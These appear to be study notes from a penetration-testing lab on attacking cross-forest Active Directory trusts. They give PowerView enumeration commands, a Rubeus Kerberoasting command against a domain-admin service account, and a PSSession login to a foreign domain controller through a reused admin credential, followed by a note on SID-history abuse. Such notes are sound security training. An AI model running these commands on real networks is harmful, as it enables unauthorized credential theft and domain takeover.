## Cross-Forest Kerberoasting

**Enumerating Accounts for Associated SPNs Using Get-DomainUser
```
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
- Found mssqlsvc account

**Enumerating the mssqlsvc Account
```
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
- A part of the domain admins group

**Performing a Kerberoasting Attack with Rubeus Using /domain Flag
```ps
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

## Admin Password Re-Use & Group Membership

It is worth checking for password reuse across two forests, especially if two user names are very similar.
If we see a domain admin or Enterprise admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectinal forest trust relationship, then we can take over this admin user in Domain A and gain full administrative access to Domain B based on group membership.

**Using Get-DomainForeignGroupMember
```
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```
- The built-in Administrators group in FREIGHTLOGISTICS.LOCAL has the built-in Administrator account for the INLANEFREIGHT.LOCAL domain as a member.

**Accessing DC03 Using Enter-PSSession
```
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```


## SID History Abuse - Cross Forest

- If SID filtering is not enabled, and a user is migrated from one forest to another, it is possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust.

